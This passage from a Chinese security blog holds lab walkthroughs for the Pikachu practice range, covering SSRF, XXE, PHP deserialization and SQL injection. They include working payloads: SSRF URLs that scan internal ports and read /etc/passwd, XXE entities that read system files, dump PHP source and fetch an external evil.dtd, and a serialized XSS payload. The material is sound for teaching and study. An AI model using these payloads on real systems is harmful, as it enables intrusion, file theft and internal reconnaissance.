<h5 id="具体可能出现SSRF的地方"><a href="#具体可能出现SSRF的地方" class="headerlink" title="具体可能出现SSRF的地方"></a>具体可能出现SSRF的地方</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line"></span><br><span class="line">2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line"></span><br><span class="line">3.在线翻译：给网址翻译对应网页的内容</span><br><span class="line"></span><br><span class="line">4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line"></span><br><span class="line">5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</span><br><span class="line"></span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</span><br><span class="line"></span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line"></span><br><span class="line">8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line"></span><br><span class="line">9.邮件系统：比如接收邮件服务器地址</span><br><span class="line"></span><br><span class="line">10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</span><br><span class="line"></span><br><span class="line">11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span><br><span class="line"></span><br><span class="line">12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</span><br></pre></td></tr></table></figure>

<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p>
<h3 id="php涉及函数"><a href="#php涉及函数" class="headerlink" title="php涉及函数"></a>php涉及函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><img src="/images/image-20230110160353697.png" alt="image-20230110160353697"></p>
<p>并且可以读取远程文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;http://www.baidu.com&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110160502725.png" alt="image-20230110160502725"></p>
<h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p><img src="/images/image-20230110160606691.png" alt="image-20230110160606691"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp = fsockopen(&quot;www.baidu.com&quot;, 80, $errno, $errstr, 30);</span><br><span class="line">if (!$fp) &#123;</span><br><span class="line">    echo &quot;$errstr ($errno)&lt;br /&gt;\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $out = &quot;GET / HTTP/1.1\r\n&quot;;</span><br><span class="line">    $out .= &quot;Host: www.baidu.com\r\n&quot;;</span><br><span class="line">    $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    while (!feof($fp)) &#123;</span><br><span class="line">        echo fgets($fp, 128);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110160659978.png" alt="image-20230110160659978"></p>
<h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><p>用于执行一个cURL会话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;http://www.baidu.com&quot;);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110160821031.png" alt="image-20230110160821031"></p>
<h1 id="SSRF-CURL"><a href="#SSRF-CURL" class="headerlink" title="SSRF(CURL)"></a>SSRF(CURL)</h1><p>起一台内网主机用于测试</p>
<p><img src="/images/image-20230110161236533.png" alt="image-20230110161236533"></p>
<p>点击后发现url指定了服务器访问的url，并将结果返回到前端</p>
<p><img src="/images/image-20230110161323352.png" alt="image-20230110161323352"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>结果返回到前端</p>
<p><img src="/images/image-20230110161521819.png" alt="image-20230110161521819"></p>
<h3 id="访问内网web"><a href="#访问内网web" class="headerlink" title="访问内网web"></a>访问内网web</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110161737693.png" alt="image-20230110161737693"></p>
<h3 id="探测主机信息"><a href="#探测主机信息" class="headerlink" title="探测主机信息"></a>探测主机信息</h3><h5 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com:4444</span><br></pre></td></tr></table></figure>

<p>baidu未开4444端口，所以会一直加载</p>
<p><img src="/images/image-20230110161709266.png" alt="image-20230110161709266"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110161737693.png" alt="image-20230110161737693"></p>
<p>192.168.28.150主机开启22222端口</p>
<h3 id="读取主机文件"><a href="#读取主机文件" class="headerlink" title="读取主机文件"></a>读取主机文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>更多利用方式参考</p>
<p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>
<h1 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h1><p>利用方式和curl的类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110162913976.png" alt="image-20230110162913976"></p>
<h5 id="探测主机端口"><a href="#探测主机端口" class="headerlink" title="探测主机端口"></a>探测主机端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110162949382.png" alt="image-20230110162949382"></p>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=../../index.php</span><br></pre></td></tr></table></figure>

<p>查看页面源代码</p>
<p><img src="/images/image-20230110163139174.png" alt="image-20230110163139174"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-XXE</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>

<p>不止这些，不同的语言支持的协议不同</p>
<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>DTD实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
<p>XML实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>DTD实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
<p>则可能存在XXE漏洞</p>
<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-php反序列化</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="以一道ctf题引出"><a href="#以一道ctf题引出" class="headerlink" title="以一道ctf题引出"></a>以一道ctf题引出</h2><p><a href="http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?word=1">http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?word=1</a></p>
<p><img src="/images/1665972756565-e4933f3d-a26c-4ef2-a97f-f9da0708a54e.png" alt="img"></p>
<p>可以看到，如果需要获取到flag，需要将$c反序列化的值等于$FALG</p>
<p><img src="/images/1665972775803-1b21d8ea-ef2d-4890-9f2e-2753b78f9764.png" alt="img"></p>
<p>$FLAG已经给出</p>
<p><img src="/images/1665972891690-095f22dc-22e6-493d-ba33-111be79975d1.png" alt="img"></p>
<p>$c等于code参数通过get请求传来的值</p>
<p><img src="/images/1665972909057-b2165398-de59-4aff-9061-b8caacd7dddd.png" alt="img"></p>
<p>这里就需要构造出”show-me-the-flag”的序列化数据</p>
<p><img src="/images/1665992918211-802ac5ad-5816-495e-a359-f0ea584d1a1d.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:16:&quot;show-me-the-flag&quot;;</span><br></pre></td></tr></table></figure>

<p>code参数传参</p>
<p><a href="http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?code=s:16:%22show-me-the-flag%22;">http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?code&#x3D;s:16:%22show-me-the-flag%22;</a></p>
<p><img src="/images/1665992981688-64633350-6878-486b-81d1-7680b139dece.png" alt="img">;</p>
<h2 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h2><h3 id="主要是两个函数"><a href="#主要是两个函数" class="headerlink" title="主要是两个函数"></a>主要是两个函数</h3><h5 id="string-serialize-mixed-value"><a href="#string-serialize-mixed-value" class="headerlink" title="string serialize ( mixed $value )"></a>string serialize ( mixed $value )</h5><p>$value: 要序列化的对象或数组。</p>
<p>返回值是序列化后的字符串</p>
<h5 id="mixed-unserialize-string-str"><a href="#mixed-unserialize-string-str" class="headerlink" title="mixed unserialize ( string $str )"></a>mixed unserialize ( string $str )</h5><p>$str: 序列化后的字符串。</p>
<p>返回的是转换之后的值，可为 integer、float、string、array 或 object。</p>
<p>如果传递的字符串不可解序列化，则返回 FALSE，并产生一个 E_NOTICE。 </p>
<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class DemoClass&#123;</span><br><span class="line">        public $name=&quot;admin&quot;;</span><br><span class="line">        public $age=18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $demo=new DemoClass();</span><br><span class="line">    echo serialize($demo)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:9:&quot;DemoClass&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;&#125;</span><br></pre></td></tr></table></figure>

<p>说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O：代表object，如果是A的话，则表示数组</span><br><span class="line"></span><br><span class="line">9：代表对象的名字占9个字符(DemoClass)</span><br><span class="line"></span><br><span class="line">DemoClass：对象名</span><br><span class="line"></span><br><span class="line">2：表示改对象中有两个变量(name,age)</span><br><span class="line"></span><br><span class="line">s：变量的数据类型，string</span><br><span class="line"></span><br><span class="line">4：表示改变量名有4个字符</span><br><span class="line"></span><br><span class="line">name：变量名</span><br><span class="line"></span><br><span class="line">后面类似</span><br><span class="line"></span><br><span class="line">admin：变量值</span><br><span class="line"></span><br><span class="line">i：变量的数据类型，int</span><br></pre></td></tr></table></figure>

<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class DemoClass&#123;</span><br><span class="line">        public $name=&quot;admin&quot;;</span><br><span class="line">        public $age=18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $demo=new DemoClass();</span><br><span class="line">    $t= serialize($demo);</span><br><span class="line">    echo unserialize($t)-&gt;name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665997664967-d018c11a-a27d-4a24-93f8-b0dac0205edb.png" alt="img"></p>
<h5 id="如果直接对类进行反序列化"><a href="#如果直接对类进行反序列化" class="headerlink" title="如果直接对类进行反序列化"></a>如果直接对类进行反序列化</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class DemoClass&#123;</span><br><span class="line">        public $name=&quot;admin&quot;;</span><br><span class="line">        public $age=18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $demo=new DemoClass();</span><br><span class="line">    $t= serialize($demo);</span><br><span class="line">    echo unserialize($t);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>会直接报错</p>
<p><img src="/images/1665997710246-6eba79c9-e252-4e61-9ef7-d0cbcbe1b860.png" alt="img"></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>序列化后的内容只有成员变量，没有成员函数</p>
<h2 id="反序列化漏洞产生原因"><a href="#反序列化漏洞产生原因" class="headerlink" title="反序列化漏洞产生原因"></a>反序列化漏洞产生原因</h2><h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__construct() //对象初始化时会调用此方法</span><br></pre></td></tr></table></figure>

<p>如果服务器能够接收我们反序列化过的字符串</p>
<p>并且未经过滤的把其中的变量直接放进这些魔术方法里面的话</p>
<p>就容易造成反序列化漏洞</p>
<h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><p>以pikachu为例</p>
<h5 id="构造pikachu靶场的反序列化漏洞payload"><a href="#构造pikachu靶场的反序列化漏洞payload" class="headerlink" title="构造pikachu靶场的反序列化漏洞payload"></a>构造pikachu靶场的反序列化漏洞payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110144806165.png" alt="image-20230110144806165"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $demo=new S();</span><br><span class="line">    echo serialize($demo);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665997935394-e3adf96e-edb6-4dd9-9252-9ee261a8474b.png" alt="img"></p>
<p>下面研究一下为何要这样构造</p>
<h5 id="pikachu反序列化漏洞源码"><a href="#pikachu反序列化漏洞源码" class="headerlink" title="pikachu反序列化漏洞源码"></a>pikachu反序列化漏洞源码</h5><p>可以i看到使用了魔法函数__construct()，对象初始化时会调用此方法，类似构造函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    var $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;o&#x27;]))&#123;</span><br><span class="line">    $s = $_POST[&#x27;o&#x27;];</span><br><span class="line">    if(!@$unser = unserialize($s))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对传入的值反序列化</p>
<p>如果是字符串啥的，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$demo=&quot;hello world&quot;;</span><br><span class="line">echo unserialize($demo);</span><br></pre></td></tr></table></figure>

<p>则unserialize不会有任何返回值，无法给unser赋值，此时给html加个p标签	</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>如果存在返回值，则将反序列化后的test变量加到p标签中</p>
<p>所以我们需要构造一个class，其中包含test变量(是否有其他变量无所谓，因为class里没用也没法用)</p>
<p>并且</p>
<p>反序列化的对象的class必须存在才行，不然也不会有啥输出</p>
<p><img src="/images/1666006109965-8d8dc99c-2602-45a6-8086-49eb432ffe4a.png" alt="img"></p>
<h5 id="所以就构造序列化的payload"><a href="#所以就构造序列化的payload" class="headerlink" title="所以就构造序列化的payload"></a>所以就构造序列化的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $demo=new S();</span><br><span class="line">    echo serialize($demo);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="payload为"><a href="#payload为" class="headerlink" title="payload为"></a>payload为</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>关于魔术函数，可以写个代码测试下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class HACK</span><br><span class="line">&#123;</span><br><span class="line">    public $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo &quot;6666666666666&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$demo=new HACK();</span><br><span class="line">$demo-&gt;test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$a=serialize($demo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$pikachu=unserialize($a);</span><br><span class="line">echo $pikachu-&gt;test;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110145751955.png" alt="image-20230110145751955"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-sql注入</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sql注入概述"><a href="#sql注入概述" class="headerlink" title="sql注入概述"></a>sql注入概述</h1><p>sql注入，就是通过将服务器查询数据库的那一部分代码，传入恶意payload进行拼接，从而执行想要的命令</p>
<h3 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id=$_POST[&#x27;id&#x27;];</span><br><span class="line">$query=&quot;select username,email from member where id=$id&quot;;</span><br><span class="line">$result=execute($link, $query);</span><br></pre></td></tr></table></figure>

<p>上述代码就是典型的可以尝试sql注入的源码</p>
